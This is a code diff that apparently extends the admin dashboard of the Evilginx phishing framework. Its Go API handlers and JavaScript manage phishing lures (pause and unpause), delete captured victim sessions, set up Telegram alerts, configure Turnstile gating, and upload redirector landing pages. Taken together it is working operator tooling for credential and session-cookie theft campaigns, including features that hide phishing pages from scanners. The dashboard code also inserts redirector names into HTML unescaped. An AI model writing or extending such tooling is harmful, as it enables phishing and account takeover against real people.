+        function toggleTurnstileHelp() {
+            const help = document.getElementById('turnstile-help');
+            help.style.display = help.style.display === 'none' ? 'block' : 'none';
+        }
+
+        // Redirector management functions
+        async function loadRedirectorCount() {
+            try {
+                const response = await fetch('/api/redirectors', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    const countEl = document.getElementById('redirector-count');
+                    if (countEl) {
+                        countEl.textContent = data.redirectors ? data.redirectors.length + ' available' : '0 available';
+                    }
+                } else {
+                    console.error('Failed to load redirector count:', response.status);
+                }
+            } catch (error) {
+                console.error('Error loading redirector count:', error);
+            }
+        }
+
+        function showRedirectorUploadModal() {
+            document.getElementById('redirectorUploadModal').classList.add('active');
+            document.getElementById('redirectorUploadError').classList.add('hidden');
+            document.getElementById('redirectorUploadForm').reset();
+        }
+
+        function showRedirectorsModal() {
+            document.getElementById('redirectorsModal').classList.add('active');
+            loadRedirectors();
+        }
+
+        async function loadRedirectors() {
+            const listEl = document.getElementById('redirectors-list');
+            listEl.innerHTML = '<div class="loading">Loading redirectors...</div>';
+
+            try {
+                const response = await fetch('/api/redirectors', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    displayRedirectors(data.redirectors || []);
+                } else {
+                    listEl.innerHTML = '<div class="error">Failed to load redirectors</div>';
+                }
+            } catch (error) {
+                console.error('Error loading redirectors:', error);
+                listEl.innerHTML = '<div class="error">Failed to load redirectors</div>';
+            }
+        }
+
+        function displayRedirectors(redirectors) {
+            const listEl = document.getElementById('redirectors-list');
+            if (redirectors.length === 0) {
+                listEl.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-secondary);">No redirectors uploaded yet</div>';
+                return;
+            }
+
+            let html = '<div style="display: grid; gap: 12px;">';
+            redirectors.forEach(redirector => {
+                html += '<div class="phishlet-card">' +
+                    '<div class="phishlet-name">' + redirector.name + '</div>' +
+                    '<div class="phishlet-status">' +
+                        '<span>Index File:</span>' +
+                        '<span>' + redirector.index_file + '</span>' +
+                    '</div>' +
+                    '<div class="phishlet-status">' +
+                        '<span>Created:</span>' +
+                        '<span>' + redirector.created_at + '</span>' +
+                    '</div>' +
+                    '<div class="phishlet-actions">' +
+                        '<button class="btn btn-danger btn-sm" onclick="deleteRedirector(\'' + redirector.name + '\')">🗑️ Delete</button>' +
+                    '</div>' +
+                '</div>';
+            });
+            html += '</div>';
+            listEl.innerHTML = html;
+        }
+
+        async function deleteRedirector(name) {
+            if (!confirm('Are you sure you want to delete redirector "' + name + '"?')) {
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/redirectors/' + encodeURIComponent(name), {
+                    method: 'DELETE',
+                    headers: { 'Authorization': authManager.token }
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    showToast('Redirector deleted successfully', 'success');
+                    loadRedirectors();
+                    loadRedirectorCount();
+                } else {
+                    showToast('Failed to delete redirector: ' + data.message, 'error');
+                }
+            } catch (error) {
+                console.error('Error deleting redirector:', error);
+                showToast('Failed to delete redirector', 'error');
+            }
+        }
+
+        function toggleRedirectorHelp() {
+            const help = document.getElementById('redirector-help');
+            help.style.display = help.style.display === 'none' ? 'block' : 'none';
+        }
+
         // Initialize the dashboard after authentication
         document.addEventListener('DOMContentLoaded', () => {
             window.dashboard = new EvilginxDashboard();
             // Dashboard will be initialized by AuthManager when authenticated
+            
+            // Load configuration when page loads (after authentication)
+            setTimeout(() => {
+                if (authManager && authManager.token) {
+                    loadTelegramConfig();
+                    loadTurnstileConfig();
+                    loadRedirectorCount();
+                }
+            }, 1000);
         });
 
         // Terminal functionality
@@ -2522,6 +3367,96 @@ func (ws *WebServer) handleAPISessionDetails(w http.ResponseWriter, r *http.Requ
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(session)
+}
+
+func (ws *WebServer) handleAPIDeleteSession(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid session ID",
+		}
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	err = ws.db.DeleteSessionById(id)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to delete session: " + err.Error(),
+		}
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	ws.db.Flush()
+	
+	response := AuthResponse{
+		Success: true,
+		Message: "Session deleted successfully",
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	sessions, err := ws.db.ListSessions()
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to get sessions: " + err.Error(),
+		}
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	deletedCount := 0
+	for _, session := range sessions {
+		err = ws.db.DeleteSessionById(session.Id)
+		if err != nil {
+			log.Warning("Failed to delete session ID %d: %v", session.Id, err)
+		} else {
+			deletedCount++
+		}
+	}
+
+	ws.db.Flush()
+	
+	response := map[string]interface{}{
+		"success": true,
+		"message": fmt.Sprintf("Deleted %d sessions successfully", deletedCount),
+		"deleted_count": deletedCount,
+		"total_sessions": len(sessions),
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
@@ -2901,6 +3836,526 @@ func (ws *WebServer) handleAPILureGetURL(w http.ResponseWriter, r *http.Request)
 		"url":  phishURL,
 	}
 
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPILurePause(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
+		return
+	}
+
+	var req struct {
+		Duration string `json:"duration"` // e.g., "1h30m", "2d", "30m"
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+
+	// Parse duration
+	duration, err := time.ParseDuration(req.Duration)
+	if err != nil {
+		// Try parsing as days (e.g., "2d")
+		if strings.HasSuffix(req.Duration, "d") {
+			daysStr := strings.TrimSuffix(req.Duration, "d")
+			days, parseErr := strconv.Atoi(daysStr)
+			if parseErr != nil {
+				http.Error(w, "Invalid duration format", http.StatusBadRequest)
+				return
+			}
+			duration = time.Duration(days) * 24 * time.Hour
+		} else {
+			http.Error(w, "Invalid duration format", http.StatusBadRequest)
+			return
+		}
+	}
+
+	lure, err := ws.cfg.GetLure(id)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusNotFound)
+		return
+	}
+
+	// Set pause until time
+	pauseUntil := time.Now().Add(duration).Unix()
+	lure.PausedUntil = pauseUntil
+
+	if err := ws.cfg.SetLure(id, lure); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	response := map[string]interface{}{
+		"success": true,
+		"message": fmt.Sprintf("Lure paused for %s", req.Duration),
+		"paused_until": time.Unix(pauseUntil, 0).Format(time.RFC3339),
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPILureUnpause(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	id, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		http.Error(w, "Invalid lure ID", http.StatusBadRequest)
+		return
+	}
+
+	lure, err := ws.cfg.GetLure(id)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusNotFound)
+		return
+	}
+
+	// Clear pause
+	lure.PausedUntil = 0
+
+	if err := ws.cfg.SetLure(id, lure); err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	response := map[string]interface{}{
+		"success": true,
+		"message": "Lure unpaused successfully",
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPITelegramConfig(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	if r.Method == "GET" {
+		// Return current Telegram configuration
+		config := map[string]interface{}{
+			"success":     true,
+			"bot_token":   ws.cfg.GetTelegramBotToken(),
+			"chat_id":     ws.cfg.GetTelegramChatId(), 
+			"enabled":     ws.cfg.GetTelegramEnabled(),
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(config)
+		return
+	}
+
+	if r.Method == "POST" {
+		var req struct {
+			BotToken string `json:"bot_token"`
+			ChatId   string `json:"chat_id"`
+			Enabled  bool   `json:"enabled"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			response := AuthResponse{
+				Success: false,
+				Message: "Invalid request",
+			}
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(response)
+			return
+		}
+
+		// Update configuration
+		if req.BotToken != "" {
+			ws.cfg.SetTelegramBotToken(req.BotToken)
+		}
+		if req.ChatId != "" {
+			ws.cfg.SetTelegramChatId(req.ChatId)
+		}
+		ws.cfg.SetTelegramEnabled(req.Enabled)
+
+		response := AuthResponse{
+			Success: true,
+			Message: "Telegram configuration updated successfully",
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+}
+
+func (ws *WebServer) handleAPITelegramTest(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Test Telegram configuration
+	botToken := ws.cfg.GetTelegramBotToken()
+	chatId := ws.cfg.GetTelegramChatId()
+	
+	if botToken == "" || chatId == "" {
+		response := AuthResponse{
+			Success: false,
+			Message: "Telegram bot token or chat ID not configured",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	telegram := NewTelegramBot()
+	telegram.Setup(botToken, chatId)
+	err := telegram.Test()
+	
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Telegram test failed: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: "Telegram test successful! Check your chat for the test message.",
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPITurnstileConfig(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	if r.Method == "GET" {
+		// Return current Turnstile configuration
+		config := map[string]interface{}{
+			"success":  true,
+			"site_key": ws.cfg.GetTurnstileSiteKey(),
+			"enabled":  ws.cfg.GetTurnstileEnabled(),
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(config)
+		return
+	}
+
+	if r.Method == "POST" {
+		var req struct {
+			SiteKey string `json:"site_key"`
+			Enabled bool   `json:"enabled"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			response := AuthResponse{
+				Success: false,
+				Message: "Invalid request",
+			}
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(response)
+			return
+		}
+
+		// Update configuration
+		if req.SiteKey != "" {
+			ws.cfg.SetTurnstileSiteKey(req.SiteKey)
+		}
+		ws.cfg.SetTurnstileEnabled(req.Enabled)
+
+		response := AuthResponse{
+			Success: true,
+			Message: "Turnstile configuration updated successfully",
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+}
+
+func (ws *WebServer) handleAPIRedirectors(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	redirectorsDir := ws.cfg.GetRedirectorsDir()
+	if redirectorsDir == "" {
+		response := map[string]interface{}{
+			"success":     true,
+			"redirectors": []interface{}{},
+			"message":     "No redirectors directory configured",
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	files, err := os.ReadDir(redirectorsDir)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to read redirectors directory: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	var redirectors []map[string]interface{}
+	for _, f := range files {
+		if f.IsDir() {
+			dirPath := filepath.Join(redirectorsDir, f.Name())
+			indexPath1 := filepath.Join(dirPath, "index.html")
+			indexPath2 := filepath.Join(dirPath, "index.htm")
+			
+			var indexFound string
+			if _, err := os.Stat(indexPath1); err == nil {
+				indexFound = "index.html"
+			} else if _, err := os.Stat(indexPath2); err == nil {
+				indexFound = "index.htm"
+			}
+
+			if indexFound != "" {
+				info, _ := f.Info()
+				redirector := map[string]interface{}{
+					"name":         f.Name(),
+					"index_file":   indexFound,
+					"created_at":   info.ModTime().Format("2006-01-02 15:04:05"),
+				}
+				redirectors = append(redirectors, redirector)
+			}
+		}
+	}
+
+	response := map[string]interface{}{
+		"success":     true,
+		"redirectors": redirectors,
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIRedirectorUpload(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Parse multipart form with 10MB max size
+	err := r.ParseMultipartForm(10 << 20) // 10MB
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to parse form: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Get redirector name
+	redirectorName := r.FormValue("name")
+	if redirectorName == "" {
+		response := AuthResponse{
+			Success: false,
+			Message: "Redirector name is required",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Validate redirector name (no path traversal)
+	if strings.Contains(redirectorName, "..") || strings.Contains(redirectorName, "/") || strings.Contains(redirectorName, "\\") {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid redirector name",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Get HTML file
+	file, handler, err := r.FormFile("html_file")
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "HTML file is required",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+	defer file.Close()
+
+	// Check file type
+	if !strings.HasSuffix(strings.ToLower(handler.Filename), ".html") && !strings.HasSuffix(strings.ToLower(handler.Filename), ".htm") {
+		response := AuthResponse{
+			Success: false,
+			Message: "File must be an HTML file (.html or .htm)",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Read file content
+	htmlContent, err := io.ReadAll(file)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to read file: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Create redirectors directory if it doesn't exist
+	redirectorsDir := ws.cfg.GetRedirectorsDir()
+	if redirectorsDir == "" {
+		// Set a default redirectors directory relative to config
+		configDir := ws.cfg.GetConfigDir()
+		redirectorsDir = filepath.Join(configDir, "redirectors")
+		ws.cfg.SetRedirectorsDir(redirectorsDir)
+	}
+
+	// Create redirector directory
+	redirectorDir := filepath.Join(redirectorsDir, redirectorName)
+	err = os.MkdirAll(redirectorDir, 0755)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to create redirector directory: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Write HTML file
+	indexPath := filepath.Join(redirectorDir, "index.html")
+	err = os.WriteFile(indexPath, htmlContent, 0644)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to write HTML file: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: fmt.Sprintf("Redirector '%s' uploaded successfully", redirectorName),
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(response)
+}
+
+func (ws *WebServer) handleAPIDeleteRedirector(w http.ResponseWriter, r *http.Request) {
+	token := r.Header.Get("Authorization")
+	if !ws.validateSession(token) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Unauthorized",
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	// Validate redirector name (no path traversal)
+	if strings.Contains(name, "..") || strings.Contains(name, "/") || strings.Contains(name, "\\") {
+		response := AuthResponse{
+			Success: false,
+			Message: "Invalid redirector name",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	redirectorsDir := ws.cfg.GetRedirectorsDir()
+	if redirectorsDir == "" {
+		response := AuthResponse{
+			Success: false,
+			Message: "No redirectors directory configured",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	redirectorDir := filepath.Join(redirectorsDir, name)
+	if _, err := os.Stat(redirectorDir); os.IsNotExist(err) {
+		response := AuthResponse{
+			Success: false,
+			Message: "Redirector not found",
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	err := os.RemoveAll(redirectorDir)
+	if err != nil {
+		response := AuthResponse{
+			Success: false,
+			Message: "Failed to delete redirector: " + err.Error(),
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	response := AuthResponse{
+		Success: true,
+		Message: fmt.Sprintf("Redirector '%s' deleted successfully", name),
+	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(response)
 }
